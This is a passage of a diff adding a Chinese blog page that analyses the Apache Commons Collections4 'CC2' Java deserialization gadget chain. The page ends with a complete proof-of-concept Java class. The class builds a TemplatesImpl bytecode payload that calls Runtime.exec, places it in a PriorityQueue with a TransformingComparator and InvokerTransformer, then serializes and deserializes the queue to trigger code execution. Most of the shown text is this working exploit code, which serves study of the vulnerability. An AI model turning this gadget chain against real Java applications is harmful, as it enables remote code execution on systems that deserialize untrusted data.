+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">payload</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">classPool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">));</span><span class="w">  </span><span class="c1">//设置前面创建的gaoren类的父类为AbstractTranslet</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">payload</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">setBody</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class="p">);</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">payload</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span></span></span></code></pre></div></div><p>反射设置<code>queue[0]</code>的值</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">queue_array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">tem</span><span class="p">,</span><span class="n">1</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">queue_field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;queue&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="n">queue_array</span><span class="p">);</span></span></span></code></pre></div></div><p>剩下的就没什么多说的了，从readObject打到compare方法的利用链和上面是一样的。</p>
+<p>poc：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="o">=</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">classPool</span><span class="o">=</span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="c1">//返回默认的类池</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classPool</span><span class="p">.</span><span class="na">appendClassPath</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">);</span><span class="c1">//添加AbstractTranslet的搜索路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">payload</span><span class="o">=</span><span class="n">classPool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;gaoren&#34;</span><span class="p">);</span><span class="c1">//创建一个新的public类</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">payload</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">classPool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">));</span><span class="w">  </span><span class="c1">//设置前面创建的gaoren类的父类为AbstractTranslet</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">payload</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">setBody</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">//创建一个空的类初始化，设置构造函数主体为runtime</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">tem</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">payload</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;gaoren&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setValue</span><span class="p">(</span><span class="n">tem</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">inv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;newTransformer&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">queue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;comparator&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">inv</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">queue_array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">tem</span><span class="p">,</span><span class="n">1</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">queue_field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.PriorityQueue&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;queue&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">queue_field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="n">queue_array</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serilize</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserilize</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serilize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.bin&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserilize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">Filename</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="n">ClassNotFoundException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">in</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">Filename</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="o">=</span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">,</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><h2 id="参考">参考</h2>
+<p><a href="https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9" target="_blank" rel="noopener noreffer ">https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-06-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/cc2/" data-title="CC2分析与利用" data-hashtags="java,反序列化"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/cc2/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a>,&nbsp;<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/cc3/" class="prev" rel="prev" title="CC3分析与利用"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CC3分析与利用</a>
+            <a href="/posts/cc4-cc5/" class="next" rel="next" title="CC4&#43;CC5分析与利用">CC4+CC5分析与利用<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
